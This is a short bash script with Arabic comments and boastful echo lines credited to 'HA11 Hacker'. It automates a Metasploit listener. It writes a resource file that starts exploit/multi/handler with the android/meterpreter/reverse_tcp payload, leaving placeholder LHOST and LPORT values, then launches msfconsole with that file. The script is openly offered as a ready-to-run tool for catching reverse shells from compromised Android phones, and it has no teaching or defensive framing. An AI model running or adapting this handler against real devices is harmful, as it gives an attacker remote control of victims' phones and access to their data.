#!/bin/bash HA11 Hacker 😂
# التأكد من وجود مسار msfconsole
echo 'ولا انا الي عامل الاسكربت من الاول الي الاخر عارف لو حد عدل عليه مش هعمل حاجه 😂'
echo 'تم الصنع من قبل  HA11 متساتش تشوف اخر برمجانا 🙂'
if ! command -v msfconsole &> /dev/null
then
    echo "هناك خطاء في الميتاسبلوت الخاصه بك😂🙂"
    exit
fi

# إعداد الأوامر المطلوبة في ملف نصي
cat << EOF > msf_commands.rc
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT your_port
exploit
EOF

# تشغيل Metasploit باستخدام الملف النصي
msfconsole -r msf_commands.rc
